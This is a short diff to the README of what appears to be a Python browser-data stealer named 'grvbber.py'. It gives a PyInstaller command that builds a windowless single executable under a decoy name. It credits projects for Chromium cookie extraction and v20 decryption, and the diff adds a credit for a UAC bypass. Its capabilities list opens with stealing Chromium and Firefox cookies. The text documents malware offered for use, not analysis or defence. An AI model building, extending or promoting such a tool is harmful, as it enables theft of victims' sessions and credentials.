@@ -29,6 +29,7 @@ pyinstaller --onefile --noconsole --name CharlieKirk --i NONE grvbber.py
 
 credits: 
 https://github.com/yanaksalvo/Browser-Data-Cookie-Extractor and https://github.com/runassu/chrome_v20_decryption for chromium v20 decryption
+https://github.com/mategol/PySilon for uac bypass
 
 <br>capabilities</br>
 - Gets cookies (chromium/firefox)
